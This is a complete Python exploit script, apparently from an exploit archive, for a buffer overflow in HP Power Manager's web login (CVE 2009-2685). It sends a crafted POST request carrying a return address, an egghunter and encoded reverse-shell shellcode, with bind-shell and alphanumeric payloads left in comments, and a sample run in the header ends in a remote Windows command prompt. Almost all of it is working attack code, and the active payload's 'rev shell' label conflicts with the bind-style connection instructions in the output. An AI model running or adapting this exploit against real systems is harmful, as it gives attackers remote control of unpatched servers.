#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
'''
   SHELL = (
   "n00bn00b"
   "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
   "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
   "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
   "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
   "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
   "\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x38"
   "\x4e\x56\x46\x32\x46\x42\x4b\x58\x45\x34\x4e\x33\x4b\x48\x4e\x47"
   "\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x38"
   "\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x58"
   "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
   "\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
   "\x46\x4f\x4b\x53\x46\x55\x46\x32\x4a\x52\x45\x47\x45\x4e\x4b\x58"
   "\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x54"
   "\x4b\x58\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x43\x50\x4e\x42\x4b\x48"
   "\x49\x38\x4e\x36\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x43\x4b\x4d"
   "\x46\x46\x4b\x38\x43\x54\x42\x33\x4b\x38\x42\x54\x4e\x30\x4b\x48"
   "\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x42\x34\x4a\x30\x50\x35\x4a\x46"
   "\x50\x48\x50\x34\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
   "\x43\x45\x48\x46\x4a\x36\x43\x43\x44\x33\x4a\x46\x47\x47\x43\x57"
   "\x44\x33\x4f\x55\x46\x45\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
   "\x4e\x4f\x4b\x33\x42\x45\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
   "\x48\x36\x41\x38\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x56\x44\x50"
   "\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
   "\x4f\x4f\x48\x4d\x43\x55\x43\x55\x43\x35\x43\x45\x43\x35\x43\x34"
   "\x43\x35\x43\x54\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x41"
   "\x4e\x35\x48\x46\x43\x55\x49\x58\x41\x4e\x45\x39\x4a\x36\x46\x4a"
   "\x4c\x31\x42\x47\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x46\x42\x51"
   "\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x42"
   "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x55\x4f\x4f\x42\x4d"
   "\x4a\x56\x45\x4e\x49\x54\x48\x58\x49\x54\x47\x45\x4f\x4f\x48\x4d"
   "\x42\x55\x46\x45\x46\x45\x45\x35\x4f\x4f\x42\x4d\x43\x59\x4a\x46"
   "\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x35"
   "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x56\x4a\x46\x43\x36"
   "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x55\x49\x35\x49\x52\x4e\x4c"
   "\x49\x58\x47\x4e\x4c\x56\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c"
   "\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x34\x4e\x42"
   "\x43\x59\x4d\x38\x4c\x57\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
   "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
   "\x48\x4d\x4b\x35\x47\x45\x44\x35\x41\x55\x41\x45\x41\x35\x4c\x56"
   "\x41\x30\x41\x55\x41\x45\x45\x35\x41\x35\x4f\x4f\x42\x4d\x4a\x56"
   "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
   "\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x58\x47\x45\x4e\x4f"
   "\x43\x58\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
   "\x4a\x36\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x45\x4f\x4f\x48\x4d"
   "\x4f\x4f\x42\x4d\x5a")
'''

# rev shell
SHELL =  b"n00bn00b"
SHELL += b"\x29\xc9\x83\xe9\xa2\xe8\xff\xff\xff\xff\xc0\x5e"
SHELL += b"\x81\x76\x0e\xb3\xaa\x90\x87\x83\xee\xfc\xe2\xf4"
SHELL += b"\x4f\x42\x1f\x87\xb3\xaa\xf0\x0e\x56\x9b\x42\xe3"
SHELL += b"\x38\xf8\xa0\x0c\xe1\xa6\x1b\xd5\xa7\xa5\x27\xcd"
SHELL += b"\x95\x9b\x6f\x0c\xc1\x82\xa1\x47\x1f\x96\xf1\xfb"
SHELL += b"\xb1\x86\xb0\x46\x7c\xa7\x91\x40\xfa\xdf\x7f\xd5"
SHELL += b"\x38\xf8\x80\x0c\xf1\x96\xc7\x86\x63\x21\xd0\xff"
SHELL += b"\x36\x6a\xe4\xcb\xb2\x7a\x1b\xdf\x93\x21\xd8\x9f"
SHELL += b"\xe3\xab\x43\x02\x7a\xde\xac\xce\x38\x9e\x1b\x86"
SHELL += b"\x65\x9b\x6f\xb6\x73\x6b\x5f\x8a\x1f\xab\x57\xbf"
SHELL += b"\x53\xdf\x64\x84\xce\x52\xab\xfa\x97\xdf\x70\xdf"
SHELL += b"\x38\xf2\xb4\x86\x60\xcc\x1b\x8b\xf8\x21\xc8\x9b"
SHELL += b"\xb2\x79\x1b\x83\x38\xab\x40\x0e\xf7\x8e\xb4\xdc"
SHELL += b"\xe8\xcb\xc9\xdd\xe2\x55\x70\xdf\xec\xf0\x1b\x95"
SHELL += b"\x5a\x2a\x6f\x78\x4c\xf7\xf8\xb4\x81\xaa\x90\xef"
SHELL += b"\xc4\xd9\xa2\xd8\xe7\xc2\xdc\xf0\x95\xad\x19\x6f"
SHELL += b"\x4c\x7a\x28\x17\xb2\xaa\x90\xae\x77\xfe\xc0\xef"
SHELL += b"\x9a\x2a\xfb\x87\x4c\x7f\xfa\x8d\xdb\x6a\x38\xb6"
SHELL += b"\x74\xc2\x92\x87\xa2\xf6\x19\x61\xe3\xfa\xc0\xd7"
SHELL += b"\xf3\xfa\xd0\xd7\xdb\x40\x9f\x58\x53\x55\x45\x10"
SHELL += b"\xd9\xba\xc6\xd0\xdb\x33\x35\xf3\xd2\x55\x45\x02"
SHELL += b"\x73\xde\x9a\x78\xfd\xa2\xe5\x6b\x5b\xcd\x90\x87"
SHELL += b"\xb3\xc0\x90\xed\xb7\xfc\xc7\xef\xb1\x73\x58\xd8"
SHELL += b"\x4c\x7f\x13\x7f\xb3\xd4\xa6\x0c\x85\xc0\xd0\xef"
SHELL += b"\xb3\xba\x90\x87\xe5\xc0\x90\xef\xeb\x0e\xc3\x62"
SHELL += b"\x4c\x7f\x03\xd4\xd9\xaa\xc6\xd4\xe4\xc2\x92\x5e"
SHELL += b"\x7b\xf5\x6f\x52\x30\x52\x90\xfa\x9b\xf2\xf8\x87"
SHELL += b"\xf3\xaa\x90\xed\xb3\xfa\xf8\x8c\x9c\xa5\xa0\x78"
SHELL += b"\x66\xfd\xf8\xf2\xdd\xe7\xf1\x78\x66\xf4\xce\x78"
SHELL += b"\xbf\x8e\x9f\x02\xc3\x55\x6f\x78\x5a\x31\x6f\x78"
SHELL += b"\x4c\xab\x53\xae\x75\xdf\x51\x44\x08\x4a\x8d\xad"
SHELL += b"\xb9\xc2\x36\x12\x0e\x37\x6f\x52\x8f\xac\xec\x8d"
SHELL += b"\x33\x51\x70\xf2\xb6\x11\xd7\x94\xc1\xc5\xfa\x87"
SHELL += b"\xe0\x55\x45\x87"


# bind shell
'''
SHELL += b"\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e"
SHELL += b"\x81\x76\x0e\x88\xb9\x85\x9a\x83\xee\xfc\xe2\xf4"
SHELL += b"\x74\x51\x07\x9a\x88\xb9\xe5\x13\x6d\x88\x45\xfe"
SHELL += b"\x03\xe9\xb5\x11\xda\xb5\x0e\xc8\x9c\x32\xf7\xb2"
SHELL += b"\x87\x0e\xcf\xbc\xb9\x46\x29\xa6\xe9\xc5\x87\xb6"
SHELL += b"\xa8\x78\x4a\x97\x89\x7e\x67\x68\xda\xee\x0e\xc8"
SHELL += b"\x98\x32\xcf\xa6\x03\xf5\x94\xe2\x6b\xf1\x84\x4b"
SHELL += b"\xd9\x32\xdc\xba\x89\x6a\x0e\xd3\x90\x5a\xbf\xd3"
SHELL += b"\x03\x8d\x0e\x9b\x5e\x88\x7a\x36\x49\x76\x88\x9b"
SHELL += b"\x4f\x81\x65\xef\x7e\xba\xf8\x62\xb3\xc4\xa1\xef"
SHELL += b"\x6c\xe1\x0e\xc2\xac\xb8\x56\xfc\x03\xb5\xce\x11"
SHELL += b"\xd0\xa5\x84\x49\x03\xbd\x0e\x9b\x58\x30\xc1\xbe"
SHELL += b"\xac\xe2\xde\xfb\xd1\xe3\xd4\x65\x68\xe6\xda\xc0"
SHELL += b"\x03\xab\x6e\x17\xd5\xd1\xb6\xa8\x88\xb9\xed\xed"
SHELL += b"\xfb\x8b\xda\xce\xe0\xf5\xf2\xbc\x8f\x46\x50\x22"
SHELL += b"\x18\xb8\x85\x9a\xa1\x7d\xd1\xca\xe0\x90\x05\xf1"
SHELL += b"\x88\x46\x50\xf0\x80\xe0\xd5\x78\x75\xf9\xd5\xda"
SHELL += b"\xd8\xd1\x6f\x95\x57\x59\x7a\x4f\x1f\xd1\x87\x9a"
SHELL += b"\x99\xe5\x0c\x7c\xe2\xa9\xd3\xcd\xe0\x7b\x5e\xad"
SHELL += b"\xef\x46\x50\xcd\xe0\x0e\x6c\xa2\x77\x46\x50\xcd"
SHELL += b"\xe0\xcd\x69\xa1\x69\x46\x50\xcd\x1f\xd1\xf0\xf4"
SHELL += b"\xc5\xd8\x7a\x4f\xe0\xda\xe8\xfe\x88\x30\x66\xcd"
SHELL += b"\xdf\xee\xb4\x6c\xe2\xab\xdc\xcc\x6a\x44\xe3\x5d"
SHELL += b"\xcc\x9d\xb9\x9b\x89\x34\xc1\xbe\x98\x7f\x85\xde"
SHELL += b"\xdc\xe9\xd3\xcc\xde\xff\xd3\xd4\xde\xef\xd6\xcc"
SHELL += b"\xe0\xc0\x49\xa5\x0e\x46\x50\x13\x68\xf7\xd3\xdc"
SHELL += b"\x77\x89\xed\x92\x0f\xa4\xe5\x65\x5d\x02\x65\x87"
SHELL += b"\xa2\xb3\xed\x3c\x1d\x04\x18\x65\x5d\x85\x83\xe6"
SHELL += b"\x82\x39\x7e\x7a\xfd\xbc\x3e\xdd\x9b\xcb\xea\xf0"
SHELL += b"\x88\xea\x7a\x4f"
'''



#EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
#EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
#EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
#EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

EH =  b""
EH += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
EH += b"\x05\x5a\x74\xef\xb8\x6e\x30\x30\x62\x89\xd7\xaf\x75"
EH += b"\xea\xaf\x75\xe7\xff\xe7"

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
            